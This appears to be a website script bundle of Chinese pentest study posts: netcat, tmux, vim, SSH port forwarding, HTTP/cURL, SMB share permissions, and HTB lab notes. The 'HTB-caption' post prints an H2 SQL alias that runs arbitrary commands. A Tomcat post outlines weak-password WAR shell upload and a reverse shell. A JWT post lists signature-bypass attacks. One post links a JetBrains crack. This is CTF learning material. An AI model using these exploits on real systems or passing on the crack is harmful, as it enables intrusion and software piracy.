  正如我们所看到的，端口 22 向我们发送了它的横幅，说明它正在运行。此技术称为 ，可帮助识别特定端口上运行的服务。 预装在大多数 Linux 发行版中。我们还[可以从此链接](https://nmap.org/download.html)下载 Windows 计算机的副本。还有另一种 Windows 替代方案，称为 [PowerCat](https://github.com/besimorhino/powercat)。 也可用于在机器之间传输文件，我们将在后面讨论。\`SSH\`\`Banner Grabbing\`\`Netcat\`\`netcat\`\`Netcat\`  

  另一个类似的网络实用程序是 [socat](https://linux.die.net/man/1/socat)，它有一些不支持的功能，例如转发端口和连接到串行设备。 还可用于[将 shell 升级为完全交互式 TTY](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-2-using-socat)。我们将在后面的部分中看到一些示例。 是一个非常方便的实用程序，应该是每个渗透测试人员工具包的一部分。在获取远程代码执行后，可以将 的[独立二进制文件](https://github.com/andrew-d/static-binaries)传输到系统中，以获得更稳定的反向 shell 连接。\`netcat\`\`Socat\`\`Socat\`\`Socat\`  

---

## 使用 Tmux

  终端多路复用器（如 or）是扩展标准 Linux 终端功能的绝佳实用程序，例如在一个终端中拥有多个窗口并在它们之间跳转。让我们看看一些使用 的例子，这是两者中更常见的。如果我们的 Linux 系统上不存在，我们可以使用以下命令安装它：\`tmux\`\`Screen\`\`tmux\`\`tmux\`  

\`\`\`
  [!bash!]**$** sudo apt install tmux -y
\`\`\`

  一旦我们有了 ，我们就可以通过输入命令来启动它：\`tmux\`\`tmux\`![tmux_1](https://academy.hackthebox.com/storage/modules/77/getting_started_tmux_1.jpg)  

  输入命令 prefix 的默认键是 。为了在 中打开一个新窗口，我们可以点击前缀 'i.e. '，然后点击 ：\`tmux\`\`[CTRL + B]\`\`tmux\`\`[CTRL + B]\`\`C\`![tmux_2](https://academy.hackthebox.com/storage/modules/77/getting_started_tmux_2.jpg)  

  我们在底部看到编号的窗口。我们可以通过点击前缀然后输入窗口编号来切换到每个窗口，例如 或 .我们还可以通过点击前缀将窗口垂直拆分为多个窗格，然后按 ：\`0\`\`1\`\`[SHIFT + %]\`![tmux_3](https://academy.hackthebox.com/storage/modules/77/getting_started_tmux_3.jpg)  

  我们还可以通过点击前缀，然后按 ：\`[SHIFT + "]\`![tmux_4](https://academy.hackthebox.com/storage/modules/77/getting_started_tmux_4.jpg)  

  我们可以通过点击前缀，然后点击 or 箭头进行水平切换或 or 箭头进行垂直切换，从而在窗格之间切换。上面的命令涵盖了一些基本用法。它是一个强大的工具，可以用于许多事情，包括日志记录，这在任何技术参与中都非常重要。这个[作弊表](https://tmuxcheatsheet.com/)是一个非常方便的参考。此外，这个 [tmux 简介](https://www.youtube.com/watch?v=Lqehvpe_djs)视频值得您花时间。\`left\`\`right\`\`up\`\`down\`\`tmux\`\`ippsec\`  

---

## 使用 Vim

  [Vim](https://linuxcommand.org/lc3_man_pages/vim1.html) 是一个很棒的文本编辑器，可用于在 Linux 系统上编写代码或编辑文本文件。使用鼠标的一大好处是它完全依赖于键盘，因此您不必使用鼠标，这（一旦我们掌握了它）将显着提高您编写/编辑代码的生产力和效率。我们通常会找到或安装在受感染的 Linux 系统上，因此学习如何使用它使我们能够即使在远程系统上编辑文件。 还有许多其他功能，例如扩展和插件，可以显着扩展其使用并使其成为出色的代码编辑器。让我们看看 的一些基础知识。要使用 打开文件，我们可以在文件后添加文件名：\`Vim\`\`Vim\`\`Vi\`\`Vim\`\`Vim\`\`Vim\`  

\`\`\`
  [!bash!]**$** vim /etc/hosts
\`\`\`

  ![vim_1](https://academy.hackthebox.com/storage/modules/77/getting_started_vim_1.jpg)  

  如果我们要创建一个新文件，请输入新文件名，然后打开一个包含该文件的新窗口。打开文件后，我们处于 只读 ，这允许我们导航和读取文件。要编辑文件，我们按 输入 ，如 底部的 “” 所示。之后，我们可以移动文本光标并编辑文件：\`Vim\`\`normal mode\`\`i\`\`insert mode\`\`-- INSERT --\`\`Vim\`  

  ![vim_2](https://academy.hackthebox.com/storage/modules/77/getting_started_vim_2.jpg)  

  完成文件编辑后，我们可以按 Esc 键退出 ，返回 。当我们在 ，我们可以使用以下键来执行一些有用的快捷方式：\`esc\`\`insert mode\`\`normal mode\`\`normal mode\`  

| 命令   | 描述                   |
| ---- | -------------------- |
| \`x\`  | 剪切字符                 |
| \`dw\` | 剪切字                  |
| \`dd\` | Cut full line （切割全线） |
| \`yw\` | 复制单词                 |
| \`yy\` | 复制整行                 |
| \`p\`  | 糊                    |

  提示： 我们可以通过在命令前添加一个数字来将任何命令乘以多次运行。例如，'4yw' 将复制 4 个单词而不是 1 个单词，依此类推。  

  如果我们要 保存文件 或 退出 ，我们必须按 进入 .完成后，我们将在 vim 窗口底部看到我们键入的任何命令：\`Vim\`\`:\`\`command mode\`![vim_3](https://academy.hackthebox.com/storage/modules/77/getting_started_vim_3.jpg)  

  我们可以使用许多命令。以下是其中的一些：  

| 命令    | 描述       |
| ----- | -------- |
| \`:1\`  | 转到第 1 行。 |
| \`:w\`  | 写入文件，保存  |
| \`:q\`  | 退出       |
| \`:q!\` | 退出而不保存   |
| \`:wq\` | 写入并退出    |

  \`Vim\`是一个非常强大的工具，并且具有许多其他命令和功能。此[备忘单](https://vimsheet.com/)是进一步释放 .\`Vim\``,Ee=`---
title: 学会SSH端口转发 
tags: [端口转发,渗透测试]
categories: [渗透测试]
---

# SSH 有三种端口转发
**本地端口转发(Local Port Forwarding)**，
:logbook:
  CLOCK: [2024-09-13 Fri 11:06:21]--[2024-09-13 Fri 11:06:22] =>  00:00:01
  CLOCK: [2024-09-13 Fri 11:06:23]--[2024-09-13 Fri 11:06:28] =>  00:00:05
:END:
远程端口转发(Local Port Forwarding)
动态端口转发(Dynamic Port Forwarding)
# 本地端口转发
vps启动一个9000的服务，但是防火墙是关闭的，现在不需要开启防火墙如何进行访问呢，（22端口开启了）
# SSH 有三种端口转发
**本地端口转发(Local Port Forwarding)**，
:logbook:
  CLOCK: [2024-09-13 Fri 11:06:21]--[2024-09-13 Fri 11:06:22] =>  00:00:01
  CLOCK: [2024-09-13 Fri 11:06:23]--[2024-09-13 Fri 11:06:28] =>  00:00:05
:END:
远程端口转发(Local Port Forwarding)
动态端口转发(Dynamic Port Forwarding)
# 本地端口转发
vps启动一个9000的服务，但是防火墙是关闭的，现在不需要开启防火墙如何进行访问呢，（22端口开启了）
![alt text](../assets/img/image-99.png)
本机执行
\`\`\`bash
  ssh -L 2000:localhost:9000 root@118.26.39.189
\`\`\`
![alt text](../assets/img/image-100.png)
## 远程端口转发
本地机器启动一个8000的服务 ，vps需要访问这个服务，如何实现，本地机器没有公网IP
![alt text](../assets/img/image-101.png)
\`\`\`bash
  ssh -R localhost:2000:localhost:8000 root@118.26.39.189
  ssh -R 2000:localhost:8000 root@118.26.39.189
  ssh -R 2000:192.168.0.100:8000 root@118.26.39.189
  同理
  
\`\`\`
![alt text](../assets/img/image-102.png)
## 动态端口转发
*远程云主机B1运行了多个服务，分别使用了不同端口，本地主机A1需要访问这些服务。*
\`\`\`
  ssh -D localhost:2000 root@118.26.39.189
\`\`\`
还是开设9000
![alt text](../assets/img/image-104.png)
![alt text](../assets/img/image-105.png)
`,ke=`---
password: lidefei
---

# **超文本传输协议 （HTTP）**

今天，我们使用的大多数应用程序（包括 Web 和移动应用程序）都不断与 Internet 交互。大多数 Internet 通信都是通过 HTTP 协议通过 Web 请求进行的。[HTTP](https://tools.ietf.org/html/rfc2616) 是用于访问万维网资源的应用程序级协议。该术语代表包含指向其他资源的链接的文本和读者可以轻松解释的文本。\`hypertext\`

HTTP 通信由客户端和服务器组成，其中客户端向服务器请求资源。服务器处理请求并返回请求的资源。HTTP 通信的默认端口是 port ，但可以根据 Web 服务器配置将其更改为任何其他端口。当我们使用互联网访问不同的网站时，会使用相同的请求。我们输入 （） 作为 （） 以访问所需的网站，例如 [www.hackthebox.com](http://www.hackthebox.com/)。\`80Fully Qualified Domain NameFQDNUniform Resource LocatorURL\`

---

# **网址**

通过 HTTP 上的资源是通过 访问的，它提供了更多的规范，而不仅仅是指定我们想要访问的网站。让我们看看 URL 的结构：

\`\`\`
URL
\`\`\`

!https://academy.hackthebox.com/storage/modules/35/url_structure.png

以下是每个组件的含义：

| **元件** | **例** | **描述** |
| --- | --- | --- |
| \`Scheme\` | \`http://\` \`https://\` | 这用于标识客户端正在访问的协议，并以冒号和双斜杠 （\`://\`) |
| \`User Info\` | \`admin:password@\` | 这是一个可选组件，其中包含用于向主机进行身份验证的凭据（用冒号分隔），并通过 at 符号 （\`:@\`) |
| \`Host\` | \`inlanefreight.com\` | host 表示资源位置。这可以是主机名或 IP 地址 |
| \`Port\` | \`:80\` | the 与 the 之间用冒号 （） 分隔。如果未指定 port，则 schemes 默认为 port，默认为 port\`PortHost:http80https443\` |
| \`Path\` | \`/dashboard.php\` | 这指向正在访问的资源，可以是文件或文件夹。如果未指定 path，则服务器返回默认索引（例如 ）。\`index.html\` |
| \`Query String\` | \`?login=true\` | 查询字符串以问号 （） 开头，由参数（例如 ）和值（例如 ）组成。多个参数可以用 & 符号 （） 分隔。\`?logintrue&\` |
| \`Fragments\` | \`#status\` | 客户端上的浏览器会处理片段，以查找主资源中的部分（例如，页面上的标题或部分）。 |

并非所有组件都需要访问资源。主要的必填字段是 scheme 和 host，没有它们，请求将没有可请求的资源。

---

# **HTTP 流**

!https://academy.hackthebox.com/storage/modules/35/HTTP_Flow.png

上图在非常高的级别上展示了 HTTP 请求的剖析。用户第一次在浏览器中输入 URL （） 时，它会向 DNS（域名解析）服务器发送请求以解析域并获取其 IP。DNS 服务器查找 IP 地址并返回该地址。所有域名都需要以这种方式解析，因为服务器在没有 IP 地址的情况下无法通信。\`inlanefreight.cominlanefreight.com\`

**注意：**我们的浏览器通常首先在本地 '' 文件中查找记录，如果其中不存在请求的域，那么它们会联系其他 DNS 服务器。我们可以使用 '' 手动添加记录以进行 DNS 解析，方法是添加 IP 后跟域名。\`/etc/hosts/etc/hosts\`

一旦浏览器获得链接到所请求域的 IP 地址，它就会向默认 HTTP 端口（例如 ）发送 GET 请求，询问根路径。然后，Web 服务器接收请求并对其进行处理。默认情况下，服务器配置为在收到请求时返回索引文件。\`80//\`

在这种情况下，Web 服务器将读取 的内容并将其作为 HTTP 响应返回。响应还包含状态代码（例如 ），表示请求已成功处理。然后，Web 浏览器呈现内容并将其呈现给用户。\`index.html200 OKindex.html\`

**注意：**本模块主要关注 HTTP Web 请求。有关 HTML 和 Web 应用程序的更多信息，您可以参考 [Web 应用程序简介](https://academy.hackthebox.com/module/details/75)模块。

---

# **卷曲**

在本模块中，我们将通过任何 Web 渗透测试人员的两个最重要的工具发送 Web 请求，即 Web 浏览器（如 Chrome 或 Firefox）和命令行工具。\`cURL\`

[cURL](https://curl.haxx.se/)（客户端 URL）是一个命令行工具和库，主要支持 HTTP 以及许多其他协议。这使它成为脚本和自动化的良好候选者，因此对于从命令行发送各种类型的 Web 请求至关重要，这对于许多类型的 Web 渗透测试都是必需的。

我们可以将基本 HTTP 请求用作 cURL 的参数，将其发送到任何 URL，如下所示：

超文本传输协议 （HTTP）

\`\`\`
DeviLeo@htb[/htb]$ curl inlanefreight.com<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
...SNIP...

\`\`\`

我们看到，与 Web 浏览器不同，cURL 不会呈现 HTML/JavaScript/CSS 代码，而是以原始格式打印它。但是，作为渗透测试人员，我们主要对请求和响应上下文感兴趣，它通常比 Web 浏览器更快、更方便。

我们还可以使用 cURL 下载页面或文件，并使用标志将内容输出到文件中。如果我们想指定输出文件名，我们可以使用 flag 并指定名称。否则，我们可以使用 cURL 将使用远程文件名，如下所示：\`-O-o-O\`

超文本传输协议 （HTTP）

\`\`\`
DeviLeo@htb[/htb]$ curl -O inlanefreight.com/index.htmlDeviLeo@htb[/htb]$ lsindex.html

\`\`\`

正如我们所看到的，这次输出没有打印出来，而是保存到 中。我们注意到 cURL 在处理请求时仍然打印了一些状态。我们可以使用 flag 将状态静音，如下所示：\`index.html-s\`

超文本传输协议 （HTTP）

\`\`\`
DeviLeo@htb[/htb]$ curl -s -O inlanefreight.com/index.html
\`\`\`

这一次，cURL 没有打印任何内容，因为输出已保存到文件中。最后，我们可以使用该标志来查看我们可以对 cURL 使用哪些其他选项：\`index.html-h\`

超文本传输协议 （HTTP）

\`\`\`
DeviLeo@htb[/htb]$ curl -hUsage: curl [options...] <url>
 -d, --data <data>   HTTP POST data
 -h, --help <category> Get help for commands
 -i, --include       Include protocol response headers in the output
 -o, --output <file> Write to file instead of stdout
 -O, --remote-name   Write output to a file named as the remote file
 -s, --silent        Silent mode
 -u, --user <user:password> Server user and password
 -A, --user-agent <name> Send User-Agent <name> to server
 -v, --verbose       Make the operation more talkative

This is not the full help, this menu is stripped into categories.
Use "--help category" to get an overview of all categories.
Use the user manual \`man curl\` or the "--help all" flag for all options.
\`\`\``,Le=`---
title: MonitorsThree
tags:
  - 网络安全
  - HTB
  - 靶场
categories:
  - HTB
password: lidefei
---

1. sql注入
   ![alt text](assets/img/image-106.png)
   admin:
`,Ie=`---
title: windows基础-NTFS 与共享权限
password: lidefei
---
# **NTFS 与共享权限**

---

Microsoft 在使用 Windows 的桌面操作系统上拥有超过 [70%](https://gs.statcounter.com/os-market-share/desktop/worldwide/#monthly-201804-202104) 的全球市场份额。这解释了为什么大多数恶意软件作者选择为 Windows 编写恶意软件，以及为什么许多人认为 Windows 不如其他操作系统安全。从商业角度来看，恶意软件作者花费资源编写 Windows 恶意软件是有意义的。这是一个高价值的目标。任何操作系统都不受恶意软件影响的想法是一种技术谬误。如果可以为操作系统编写软件，那么可以为操作系统编写病毒。请记住，根据定义，病毒是出于恶意编写的软件，可以为任何操作系统编写。为 Windows 编写的许多恶意软件变体可以通过应用了宽松权限的网络共享在网络上传播。还值得注意的是，直到今天，这个臭名昭著的漏洞仍然困扰着正在运行的未打补丁的 Windows 系统，并且经常为勒索软件关闭组织铺平道路。\`EternalBlueSMBv1\`

（） 在 Windows 中用于连接共享资源，如文件和打印机。它用于大型、中型和小型企业环境。请参阅下图以直观地了解此概念：\`Server Message Block protocolSMB\`

!https://academy.hackthebox.com/storage/modules/49/smb_diagram.png

注意：每当您看到某个概念的可视化/图表时，请花时间彻底理解它。一张图片可能胜过千言万语，但在阅读时非常诱人地跳过。

NTFS 权限和共享权限通常被理解为相同。请注意，它们并不相同，但通常适用于相同的共享资源。让我们看一下可以设置的各个权限，以保护/授予对象对运行 NTFS 文件系统的 Windows 操作系统上托管的网络共享的访问权限。

### **共享权限**

| **许可** | **描述** |
| --- | --- |
| \`Full Control\` | 允许用户执行更改和读取权限提供的所有操作，以及更改 NTFS 文件和子文件夹的权限 |
| \`Change\` | 允许用户读取、编辑、删除和添加文件和子文件夹 |
| \`Read\` | 用户可以查看文件和子文件夹内容 |

### **NTFS 基本权限**

| **许可** | **描述** |
| --- | --- |
| \`Full Control\` | 用户可以添加、编辑、移动、删除文件和文件夹，以及更改适用于所有允许文件夹的NTFS权限。 |
| \`Modify\` | 允许用户查看和修改文件和文件夹的权限。这包括添加或删除文件 |
| \`Read & Execute\` | 允许用户或拒绝读取文件内容和执行程序的权限 |
| \`List folder contents\` | 允许用户或拒绝用户查看文件和子文件夹列表的权限 |
| \`Read\` | 允许或拒绝用户读取文件内容的权限 |
| \`Write\` | 允许或拒绝用户对文件写入更改以及将新文件添加到文件夹的权限 |
| \`Special Permissions\` | 各种高级权限选项 |

### **NTFS 特殊权限**

| **许可** | **描述** |
| --- | --- |
| \`Full control\` | 用户有权添加、编辑、移动、删除文件和文件夹，以及更改适用于所有允许文件夹的NTFS权限。 |
| \`Traverse folder / execute file\` | 允许或拒绝用户访问目录结构中的子文件夹的权限，即使拒绝用户访问父文件夹级别的内容也是如此。用户也可能被允许或拒绝执行程序的权限 |
| \`List folder/read data\` | 允许用户或拒绝用户查看父文件夹中包含的文件和文件夹的权限。还可以允许用户打开和查看文件 |
| \`Read attributes\` | 允许用户或拒绝查看文件或文件夹的基本属性的权限。基本属性示例：system、archive、read-only 和 hidden |
| \`Read extended attributes\` | 允许用户或拒绝查看文件或文件夹的扩展属性的权限。属性因程序而异 |
| \`Create files/write data\` | 允许用户或拒绝用户在文件夹中创建文件和更改文件的权限 |
| \`Create folders/append data\` | 允许用户或拒绝在文件夹中创建子文件夹的权限。可以将数据添加到文件中，但不能覆盖预先存在的内容 |
| \`Write attributes\` | 允许或拒绝用户更改文件属性。此权限不授予创建文件或文件夹的权限 |
| \`Write extended attributes\` | 允许用户或拒绝用户更改文件或文件夹的扩展属性的权限。属性因程序而异 |
| \`Delete subfolders and files\` | 允许用户删除子文件夹和文件的权限。不会删除父文件夹 |
| \`Delete\` | 允许用户或拒绝用户删除父文件夹、子文件夹和文件的权限。 |
| \`Read permissions\` | 允许或拒绝用户读取文件夹的权限 |
| \`Change permissions\` | 允许用户或拒绝用户更改文件或文件夹的权限 |
| \`Take ownership\` | 允许用户或拒绝用户获得文件或文件夹的所有权。文件所有者具有更改任何权限的完全权限 |

请记住，NTFS 权限适用于托管文件夹和文件的系统。默认情况下，在 NTFS 中创建的文件夹会从父文件夹继承权限。可以禁用继承以设置对父文件夹和子文件夹的自定义权限，就像我们稍后将在本模块中所做的那样。当通过 SMB 访问文件夹时（通常从网络中的其他系统访问），共享权限适用。这意味着在本地或通过 RDP 登录到计算机的人只需导航到文件系统上的位置即可访问共享文件夹和文件，并且只需要考虑 NTFS 权限。NTFS 级别的权限使管理员能够更精细地控制用户可以在文件夹或文件中执行的操作。

---

# **创建网络共享**

为了对 SMB 及其与 NTFS 的关系有一个扎实的基本理解，我们将在 上创建一个网络共享。\`Windows 10 target box\`

注意：让 Pwnbox 在单独的显示器上全屏打开是一种理想的学习体验，这样我们至少可以有一个显示器专门用于显示书面内容，还有一个显示器用于我们正在交互的盒子。或者，如果我们只能访问一个显示器，我们可以将该显示器用于与盒子和智能手机或平板电脑交互以引用写入的内容。

在这种情况下，我们将首先在 Windows 10 桌面上创建一个新文件夹来创建共享文件夹。请记住，在大多数大型企业环境中，共享是在存储区域网络 （SAN）、网络连接存储设备 （NAS） 或通过服务器操作系统（如 Windows Server）访问的驱动器上的单独分区上创建的。如果我们在桌面操作系统上遇到共享，它可能是一家小型企业，也可能是渗透测试人员或恶意攻击者用来收集和泄露数据的滩头系统。

我们将使用 Windows 中的 GUI 完成此过程。

### **创建文件夹**

!https://academy.hackthebox.com/storage/modules/49/creating_directory.png

我们将使用该选项来配置我们的共享。\`Advanced Sharing\`

### **将文件夹设为共享文件夹**

!https://academy.hackthebox.com/storage/modules/49/configuring_share.png

请注意共享名称如何自动默认为文件夹的名称。此外，我们可以看到可以限制可以同时连接到此共享的用户数。在实际环境中，管理员最好根据经常需要访问正在共享的资源的用户数来设置此数字。

与 NTFS 权限类似，有一个 （） 用于共享资源。我们可以将此视为 SMB 权限列表。请记住，对于共享资源，SMB 和 NTFS 权限列表都适用于在 Windows 中共享的每个资源。ACL 包含 （）。通常这些ACEs由&（也称为安全主体）组成，因为它们是管理和跟踪对共享资源的访问的合适机制。\`access control listACLaccess control entriesACEsusersgroups\`

请注意默认的 access control entry 和 permissions 设置。

### **共享权限 ACL（“共享”选项卡）**

!https://academy.hackthebox.com/storage/modules/49/share_permissions.png

现在，我们将应用这些设置来测试此 ACL 的效果以及按原样应用的权限。我们将通过打开终端并使用 来测试 Pwnbox 的连接。\`smbclient\`

注意：从技术上讲，服务器是一种用于为客户端请求提供服务的软件功能。在这种情况下，Pwnbox 是我们的客户端，而 Windows 10 目标框是我们的服务器。

### **使用 smbclient 列出可用的共享**

NTFS 与共享权限

\`\`\`
DeviLeo@htb[/htb]$ smbclient -L SERVER_IP -U htb-studentEnter WORKGROUP\\htb-student's password:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin	C$              Disk      Default share	Company Data    Disk
	IPC$            IPC       Remote IPC
\`\`\`

### **连接到公司数据共享**

NTFS 与共享权限

\`\`\`
DeviLeo@htb[/htb]$ smbclient '\\\\SERVER_IP\\Company Data' -U htb-studentPassword for [WORKGROUP\\htb-student]:
Try "help" to get a list of possible commands.

smb: \\>

\`\`\`

如果我们的所有条目都正确无误，并且我们的权限列表中存在至少具有读取权限的 Everyone 组，那么什么可能会阻止我们访问此共享？

---

# **Windows Defender 防火墙注意事项**

Windows Defender 防火墙可能会阻止对 SMB 共享的访问。由于我们从基于 Linux 的系统进行连接，因此防火墙已阻止来自任何未加入同一设备的访问 .同样重要的是要注意，当 Windows 系统是工作组的一部分时，所有请求都会根据该特定 Windows 系统的数据库进行身份验证。当 Windows 系统加入 Windows 域环境时，所有 netlogon 请求都将根据 进行身份验证。工作组和 Windows 域在身份验证方面的主要区别在于，工作组使用本地 SAM 数据库，而在 Windows 域中使用基于网络的集中式数据库 （Active Directory）。我们在尝试登录和验证Windows系统时必须知道这些信息。考虑 htb-student 账户的托管位置以正确连接到目标。\`workgroupnetlogonSAMActive Directory\`

在防火墙阻止连接方面，可以通过在 Windows 中完全停用每个防火墙配置文件或在 中启用特定的预定义入站防火墙规则来测试。像大多数防火墙一样，Windows Defender防火墙允许或拒绝流量（在这种情况下是访问和连接请求）流动和/或\`Windows Defender Firewall advanced security settingsinboundoutbound\`

不同的入站和出站规则与 Defender 中的不同防火墙配置文件相关联。

Windows Defender 防火墙配置文件：

- \`Public\`
- \`Private\`
- \`Domain\`

最佳实践是启用预定义规则或添加自定义例外，而不是完全停用防火墙。不幸的是，为了方便或缺乏理解而完全停用防火墙是很常见的。通过使用组策略加入 Windows 域环境时，可以集中管理桌面系统上的防火墙规则。组策略概念和配置超出了本模块的范围。

启用适当的防火墙规则后，我们将成功连接到共享。请记住，我们只能连接到共享，因为我们使用的用户帐户 （） 位于 .回想一下，我们将 Everyone 组的特定共享权限设置为 Read，这实际上意味着我们将只能读取此共享上的文件。一旦与共享建立连接，我们就可以创建一个从 Pwnbox 到 Windows 10 目标框的文件系统。在这里，我们还必须考虑 NTFS 权限与共享权限一起应用。回想一下，NTFS 是 Windows 中的默认文件系统。让我们跳回到 Windows 10 目标框的 xfreerdp 会话，看看 Company Data 文件夹的 NTFS 权限。\`inboundhtb-studentEveryone groupmount point\`

### **NTFS 权限 ACL（“安全”选项卡）**

!https://academy.hackthebox.com/storage/modules/49/ntfs.png

NTFS 权限可以应用于用户和组，从而进行更精细的控制。每当我们在权限旁边看到灰色复选标记时，它都是从父目录继承的。默认情况下，所有 NTFS 权限都是从父目录继承的。在 Windows 世界中，它是统治所有目录的父目录，除非系统管理员在新创建的文件夹的高级安全设置中禁用继承。\`C:\\ drive\`

在许多情况下，组织的系统管理员将负责决定用户或用户组对网络资源获得哪些权限。这就是为什么许多鱼叉式网络钓鱼攻击都是针对系统管理员和其他 IT 领导者的原因。他们对他们所监督的环境中允许的内容有很大的影响力，在许多情况下甚至比组织的非技术 C 级领导者还要大。例如，在医院工作的医生或管理人员将不具有对网络的管理权限，但系统管理员可以。

现在让我们在共享级别为 Everyone 组提供，并通过尝试从 Pwnbox 的桌面创建到共享的挂载点来测试更改的影响\`Full control\`

### **挂载到共享**

NTFS 与共享权限

\`\`\`
DeviLeo@htb[/htb]$ sudo mount -t cifs -o username=htb-student,password=Academy_WinFun! //ipaddoftarget/"Company Data" /home/user/Desktop/
\`\`\`

如果此命令不起作用，请检查语法。如果语法正确但命令仍然不起作用，则可能需要安装。这可以通过以下命令完成：\`cifs-utils\`

### **安装 CIFS 实用程序**

NTFS 与共享权限

\`\`\`
DeviLeo@htb[/htb]$ sudo apt-get install cifs-utils
\`\`\`

一旦我们在 Pwnbox 的桌面上成功创建了挂载点，我们应该看看 Windows 内置的几个工具，它们将允许我们跟踪和监控我们所做的工作。

该命令允许我们查看系统上的所有共享文件夹。请注意我们创建的共享以及 C：\\ 驱动器。\`net share\`

\`Do you remember us sharing the C:\\ drive?\`

我们没有手动共享 C：。Windows 系统上包含最重要文件的最重要的驱动器在安装时通过 SMB 共享。这意味着任何具有适当访问权限的人都可以远程访问网络上每个 Windows 系统的整个 C：\\。

我们还可以看到我们创建的共享。

### **使用 Net Share 显示共享**

NTFS 与共享权限

\`\`\`
C:\\Users\\htb-student> net share

Share name   Resource                        Remark

-------------------------------------------------------------------------------
C$           C:\\                             Default share
IPC$                                         Remote IPC
ADMIN$       C:\\WINDOWS                      Remote Admin
Company Data C:\\Users\\htb-student\\Desktop\\Company Data

The command completed successfully.

\`\`\`

\`Computer Management\`是我们可以用来识别和监控 Windows 系统上共享资源的另一种工具。

### **从计算机管理中监控共享**

!https://academy.hackthebox.com/storage/modules/49/computer_management.png

我们可以在 ， 中四处探索，并了解它为我们提供了什么信息。如果我们协助个人或组织应对与 SMB 相关的违规行为，这些都是检查并开始了解违规行为可能如何发生以及可能留下什么的好地方。\`SharesSessionsOpen Files\`

### **在 Event Viewer 中查看共享访问日志**

\`Event Viewer\`是调查在 Windows 上完成的操作的另一个好位置。几乎每个操作系统都有一个日志记录机制和一个实用程序来查看捕获的日志。要知道，日志就像计算机的日志条目，计算机在其中记下执行的所有操作以及与该操作相关的许多详细信息。我们可以查看为我们在访问 Windows 10 目标框以及创建、编辑和访问共享文件夹时执行的每项操作创建的日志。

![alt text](https://academy.hackthebox.com/storage/modules/49/event_viewer.png)`,De=`---
title: 应急响应 
tags: [防御,网络安全]
categories: [网络安全]
---


> 防御是安全行业中根本技能
# 
攻防演练是指模拟真实的网络攻击事件，对网络安全防御能力进行检验和提升的一种训练活动。攻防演练的目的是检验网络安全防御体系的有效性，发现安全漏洞，提高网络安全防御能力。攻防演练的主要内容包括网络攻击、网络防御、网络监控、网络溯源等。


网络安全的应急响应是指在网络安全事件发生后，对事件进行处理的过程。应急响应的目的是尽快恢复网络服务，减少损失，保护网络安全。应急响应的主要内容包括事件的检测、分析、处理和恢复。




![alt text](../assets/img/{78EC29F4-4B78-43B8-949B-FD13F0B272E4}.png)`,Me=`---
title: HTB-caption
tags:
  - 网络安全
  - HTB
  - 靶场
categories:
  - HTB
password: lidefei
---

1. root:root
![alt text](../assets/img/{B831FCD2-CB24-47A2-A74B-BEE516299CDC}.png)

http://10.10.11.33:8080/admin/dbviewer

考虑到 GitBucket 是一个 java Web 应用程序，从 cookie 中：JSESSIONID，我们想到了 H2，它是一个用 Java 编写的关系数据库管理系统（我们可以通过运行不正确的查询来确认这一点），我们使用查找版本，它是 1.4.199。在谷歌上搜索，我们发现了这篇关于链接 RCE 的 H2 数据库中的漏洞的 Medium 帖子。SELECT H2VERSION() FROM DUALH2 java 1.4.199 exploit

所以基本上，H2 容易受到 RCE 的攻击，我们可以执行任意命令。我们首先创建一个名为 REVEXEC 的别名，这将允许我们稍后运行 shell 命令和执行代码。
\`\`\`sql
CREATE ALIAS REVEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A");
    return s.hasNext() ? s.next() : ""; 
}$$;
\`\`\`

![alt text](../assets/img/{CB7890AC-9968-4B06-BC49-085D9DC6C814}.png)


执行后，我们现在可以调用我们的别名来执行命令。

![alt text](../assets/img/{9BF84C05-6926-491B-9D46-F08668B09AD7}.png)


![alt text](../assets/img/{FB6DC057-1964-4F82-B362-CE0D31E22E67}.png)

公钥私钥？
利用私钥登录？
![alt text](../assets/img/{C79FD5D5-5C46-4C55-B26D-DE8C62B932BC}.png)

![alt text](../assets/img/{B77018B7-C1FA-4031-8F76-6136A6BE1F45}.png)
![alt text](../assets/img/{789671E9-4632-4454-A382-D41C38D76855}.png)

为啥？
反弹shell？`,Ne=`---
title: JB全家桶破解指南 
categories: [JetBrains]
---

里面下载附件

[附件](/assets/file/win2021-2024.zip)

## 地区不要选择中国

https://3.jetbra.in/`,Re=`---
title: Web中间件-Tomcat8
tags: [Web中间件,Tomcat]
categories: [网络安全]
---
1. 界面
![alt text](../assets/img/image-107.png)
2. manager 弱口令
   ![alt text](../assets/img/image-108.png)
3. 上传 war 包
   直接将shell.jsp压缩，修改后缀为.war即可上传
   ![alt text](../assets/img/image-109.png)
4. 反弹shell
   ![alt text](../assets/img/image-110.png)
   意思是在shell文件下的shell.jsp`,Fe=`---
title: MonitorsThree
tags:
  - THB
  - Linux
categories:
  - 网络安全
password: lidefei
---

1. 信息搜集
   1. 端口扫描
   2. ![alt text](../assets/img/image-115.png)
   3. 目录扫描
2. 查找子域
   1. 历史漏洞
3. etc/passwd
   查找ssh passwd`,Oe=`---
title: JWT专题 
tags: [JWT,web安全,认证,授权]
categories: [网络安全]
---

json web token
1. 登录 -> server
2. token
3. send auth-head:token
4. head.payload.sign
	head{alg,type,option}
	payload {身份信息}
exp:
1. 空加密
2. 未校验签名
3. 爆破密钥
4. kid 注入

`,Ue=`---
title: 网络安全打靶总结
tags:
  - 网络安全
  - HTB
  - OFFSEC
categories:
  - 网络安全
image:
  path: ../assets/img/image-116.png
password:
---

## 靶场平台

这里重要练习的靶场有:

| 靶场           | 推荐指数  | 评价                                                                         |
| ------------ | ----- | -------------------------------------------------------------------------- |
| Hack The Box | ⭐⭐⭐⭐⭐ | 内容难度中, 完整的攻击流程 从webshell到rootshell，有赛季靶场基本一周一个，互联网上基本没有wp, 全靠自己, 容易放弃      |
| VulnHub      | ⭐⭐⭐⭐  | OFFSEC维护，现在没啥新出的靶场了，但是历史靶场有好多思路可以参考                                        |
| TryHackMe    | ⭐⭐⭐⭐  | 这里我只是使用的在线攻击机和靶场，openvpn在我这里网络有问题还没解决，知道的可以留言，请教一下，顺便说一下它家的知识文档挺好的，可以当作知识库 |
| OverTheWire  | ⭐⭐    | 适合初学者, 有很多靶场, 有很多靶场有详细的攻击流程                                                |
